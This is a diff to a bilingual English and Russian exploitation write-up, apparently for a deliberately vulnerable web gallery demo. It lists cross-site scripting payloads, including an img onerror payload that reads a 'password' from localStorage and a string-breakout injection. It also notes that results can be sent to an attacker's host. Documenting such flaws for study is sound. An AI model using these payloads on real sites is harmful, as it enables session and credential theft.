@@ -12,7 +12,7 @@ App idea - public web galery. Primitive in essense and functionality. Especially
 Explotation:
 1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
 2.	<img src=x onerror=alert(1) '>
-3.	alert("blabla")
+3.	'), alert(1), alert(2), ('
 
 
 Any of exploits can be extracted to remote “attacker” host via concatenation of expression evaluation to malicious address:
@@ -41,7 +41,7 @@ And again returned in last several years
 Использование:
 1.	<img src=x onerror="alert(localStorage.getItem('password'))" '>
 2.	<img src=x onerror=alert(1) '>
-3.	alert("blabla")
+3.	'), alert(1), alert(2), ('
 
 
 Любая из уязвимостей может быть использована вместе с извлечением на хост атакующего через конкатенацию вычисляемого выражения к адресу атакующего:
